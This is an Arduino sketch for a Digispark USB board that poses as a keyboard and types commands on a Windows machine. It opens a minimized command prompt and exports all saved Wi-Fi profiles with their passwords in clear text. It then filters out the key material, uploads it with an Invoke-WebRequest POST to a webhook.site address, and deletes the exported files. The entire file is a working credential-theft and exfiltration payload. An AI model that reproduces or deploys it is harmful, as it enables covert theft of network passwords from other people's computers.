#include "DigiKeyboard.h"

// Configuration
#define LED_PIN 1
#define CMD_COLS 15
#define CMD_LINES 1
#define WEBHOOK_URL "https://webhook.site/your-webhook-address"

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  // Initialize
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  // Open minimized CMD as admin
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd /k mode con: cols=");
  DigiKeyboard.print(CMD_COLS);
  DigiKeyboard.print(" lines=");
  DigiKeyboard.println(CMD_LINES);
  DigiKeyboard.delay(500);
  
  // Execute commands
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(300);
  
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("powershell Invoke-WebRequest -Uri ");
  DigiKeyboard.print(WEBHOOK_URL);
  DigiKeyboard.println(" -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("del Wi-* /s /f /q");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  // LED blinking pattern
  while (true) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(100);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(100);
  }
}